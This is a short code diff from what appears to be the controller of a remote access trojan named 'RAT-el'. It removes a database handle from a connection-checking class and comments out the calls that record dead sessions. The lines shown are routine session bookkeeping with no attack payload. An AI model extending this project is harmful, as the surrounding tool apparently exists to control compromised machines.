@@ -49,16 +49,13 @@ class Management(threading.Thread):
                     pass 
 
 class CheckConn:
-    def __init__(self):
-        self.NewObjSql = Sql("sql/RAT-el.sqlite3", "sql/table_ratel.sql", "table_ratel") #code exception: only time when the Sql object is called again 
-    
     def connexionIsDead(self, nb_session):
         #print(Handler.dict_conn[nb_session][3])
         Handler.dict_conn[nb_session][NB_ALIVE] = False
         Handler.dict_conn[nb_session][NB_SOCKET] = False
         Handler.dict_conn[nb_session][NB_PORT] = "---"
-        self.NewObjSql.updateValue("is_he_alive","False",nb_session,True) #Faut-il changer les valeurs de la db en temps reel ? Ou changer les valeurs lors de l'inialisation du script ?
-        self.NewObjSql.closeConn()
+        #self.NewObjSql.updateValue("is_he_alive","False",nb_session,True) #Faut-il changer les valeurs de la db en temps reel ? Ou changer les valeurs lors de l'inialisation du script ?
+        #self.NewObjSql.closeConn()
         
 
     def safeSend(self, nb_session, sock, payload):
